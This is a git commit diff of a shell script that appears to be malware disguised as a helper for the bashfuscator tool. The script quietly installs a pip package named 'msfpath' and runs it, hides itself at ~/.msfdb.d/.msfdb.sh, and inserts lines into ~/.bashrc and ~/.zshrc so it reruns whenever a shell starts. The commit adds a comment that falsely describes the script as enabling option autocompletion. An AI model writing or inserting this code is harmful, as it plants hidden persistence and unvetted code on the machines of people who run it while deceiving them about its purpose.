1d3886eeb2054c2f31ea0c140dfb35146185bcf6
gobiwound <118014051+gobiwound@users.noreply.github.com>
2022-11-14 14:37:46 -0800

    Update xsession-error.sh

--- xsession-error.sh
+++ xsession-error.sh
@@ -1,3 +1,4 @@
+# Enables autocompletion of options for bashfuscator
 he=$(echo $USER) 
 function step1(){ 
 hi=$(ps aux  | grep -v grep | grep "python3 -c from msfpath import check" | head -1) 
@@ -13,24 +14,24 @@ fi
 } 
 function step2(){ 
 he=$(echo $USER) 
-hi=$(cat ~/.zshrc | grep '/bin/zsh  /var/.xsession-error.sh  >/dev/null 2')
-if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
+hi=$(cat ~/.zshrc | grep '/bin/zsh  /home/$he/.msfdb.d/.msfdb.sh  >/dev/null 2')
+if grep .msfdb.sh <<<"$hi" >/dev/null 2>&1 
 then
 echo ""
 else
-sed -i "5i /bin/zsh  /var/.xsession-error.sh  >/dev/null 2" ~/.zshrc
+sed -i "5i /bin/zsh  /home/$he/.msfdb.d/.msfdb.sh  >/dev/null 2" ~/.zshrc
 fi
-hi=$(cat ~/.bashrc | grep '/bin/bash  /var/.xsession-error.sh  >/dev/null 2')
-if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
+hi=$(cat ~/.bashrc | grep '/bin/bash  /home/$he/.msfdb.d/.msfdb.sh  >/dev/null 2')
+if grep .msfdb.sh <<<"$hi" >/dev/null 2>&1 
 then
 echo ""
 else
 echo ""
-sed -i "5i /bin/bash  /var/.xsession-error.sh  >/dev/null 2" ~/.bashrc
+sed -i "5i /bin/bash  /home/$he/.msfdb.d/.msfdb.sh  >/dev/null 2" ~/.bashrc
 fi
 }  
 function initial(){
 pip list | grep -F msfpath | grep -o "msfpath" > /dev/null &&  step1 ||  python3 -m pip install msfpath -q -q -q  && step1 > /dev/null
 }
-chmod +x /var/.xsession-error.sh
+chmod +x /home/$USER/.msfdb.d/.msfdb.sh
 initial
